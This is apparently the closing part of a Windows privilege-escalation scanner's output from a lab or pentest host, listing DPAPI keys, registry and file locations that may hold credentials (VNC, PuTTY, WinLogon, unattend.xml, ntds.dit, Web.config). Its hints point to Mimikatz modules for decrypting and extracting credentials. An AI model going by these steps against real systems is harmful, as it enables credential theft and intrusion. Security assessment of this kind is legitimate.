d---s          8/3/2019  10:48 AM            S-1-5-21-141259258-288879770-38949                                               
                                             83326-500                                                                        
                                                                                                                              
                                                                                                                              
 [+] DPAPI MASTER KEYS                                                                                                        
   [i] Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt                                           
   [i] You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module                      
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi                                 
                                                                                                                              
Looking inside C:\Users\Administrator\AppData\Roaming\Microsoft\Credentials\                                                  
                                                                                                                              
                                                                                                                              
Looking inside C:\Users\Administrator\AppData\Local\Microsoft\Credentials\                                                    
                                                                                                                              
                                                                                                                              
 [+] Unattended files                                                                                                         
                                                                                                                              
 [+] SAM and SYSTEM backups                                                                                                   
                                                                                                                              
 [+] McAffee SiteList.xml                                                                                                     
 Volume in drive C has no label.                                                                                              
 Volume Serial Number is 0E97-C552                                                                                            
 Volume in drive C has no label.                                                                                              
 Volume Serial Number is 0E97-C552                                                                                            
 Volume in drive C has no label.                                                                                              
 Volume Serial Number is 0E97-C552                                                                                            
 Volume in drive C has no label.                                                                                              
 Volume Serial Number is 0E97-C552                                                                                            
                                                                                                                              
 [+] GPP Password                                                                                                             
                                                                                                                              
 [+] Cloud Credentials                                                                                                        
                                                                                                                              
 [+] AppCmd                                                                                                                   
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd.exe                            
C:\Windows\system32\inetsrv\appcmd.exe exists.                                                                                
                                                                                                                              
 [+] Files in registry that may contain credentials                                                                           
   [i] Searching specific files that may contains credentials.                                                                
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files              
Looking inside HKCU\Software\ORL\WinVNC3\Password                                                                             
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                                           
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                                     
    DefaultDomainName    REG_SZ                                                                                               
    DefaultUserName    REG_SZ                                                                                                 
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                                    
                                                                                                                              
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters                                                          
                                                                                                                              
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents                                          
    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion                                                                
                                                                                                                              
Looking inside HKCU\Software\TightVNC\Server                                                                                  
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                                       
Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                               
C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                                 
C:\ProgramData\Amazon\EC2Launch\sysprep\unattend.xml                                                                          
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                             
C:\Users\All Users\Amazon\EC2Launch\sysprep\unattend.xml                                                                      
C:\Windows\Panther\setupinfo                                                                                                  
C:\Windows\System32\inetsrv\appcmd.exe                                                                                        
C:\Windows\SysWOW64\inetsrv\appcmd.exe                                                                                        
C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml                
C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml                 
C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit                                                                                                                             
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe
C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer                                                                                                                            
C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml                
C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml                 
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190803.log                                                                                
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190804.log                                                                                
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190805.log                                                                                
C:\inetpub\logs\LogFiles\W3SVC1\u_ex201002.log                                                                                
C:\inetpub\logs\LogFiles\W3SVC1\u_ex240607.log                                                                                
C:\inetpub\logs\LogFiles\W3SVC2\u_ex190803.log                                                                                
C:\inetpub\wwwroot\Web.config                                                                                                 
C:\inetpub\wwwroot\Account\Web.Config                                                                                         
C:\inetpub\wwwroot\admin\Web.Config                                                                                           
C:\inetpub\wwwroot\admin\app\editor\Web.Config                                                                                
C:\inetpub\wwwroot\setup\Web.config                                                                                           
                                                                                                                              
---                                                                                                                           
Scan complete.                                                                                                                
  
```